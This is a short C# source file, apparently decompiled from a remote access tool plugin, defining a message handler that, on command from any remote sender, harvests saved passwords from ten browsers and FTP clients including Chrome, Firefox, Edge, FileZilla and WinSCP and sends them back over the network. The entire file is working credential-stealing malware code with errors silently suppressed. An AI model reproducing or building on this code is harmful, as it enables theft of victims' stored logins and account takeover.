

using InvokedCommon.Messages;
using InvokedCommon.Models;
using InvokedCommon.Networking;
using Plugin.Helper;
using Plugin.Helper.Browsers;
using Plugin.Helper.FtpClients;
using System;
using System.Collections.Generic;


namespace Plugin.MessageHandlers
{
	public class PluginPasswordRecoveryHandler : IMessageProcessor
	{
		public bool CanExecute(IMessage message) => message is GetPasswords;

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			if (!(message is GetPasswords message1))
				return;
			this.Execute(sender, message1);
		}

		private void Execute(ISender client, GetPasswords message)
		{
			List<RecoveredAccount> recoveredAccountList = new List<RecoveredAccount>();
			IAccountReader[] accountReaderArray = new IAccountReader[10]
			{
				(IAccountReader) new BravePassReader(),
				(IAccountReader) new ChromePassReader(),
				(IAccountReader) new OperaPassReader(),
				(IAccountReader) new OperaGXPassReader(),
				(IAccountReader) new EdgePassReader(),
				(IAccountReader) new YandexPassReader(),
				(IAccountReader) new FirefoxPassReader(),
				(IAccountReader) new InternetExplorerPassReader(),
				(IAccountReader) new FileZillaPassReader(),
				(IAccountReader) new WinScpPassReader()
			};
			foreach (IAccountReader accountReader in accountReaderArray)
			{
				try
				{
					recoveredAccountList.AddRange(accountReader.ReadAccounts());
				}
				catch (Exception ex)
				{
				}
			}
			client.Send<GetPasswordsResponse>(new GetPasswordsResponse()
			{
				RecoveredAccounts = recoveredAccountList
			});
		}
	}
}
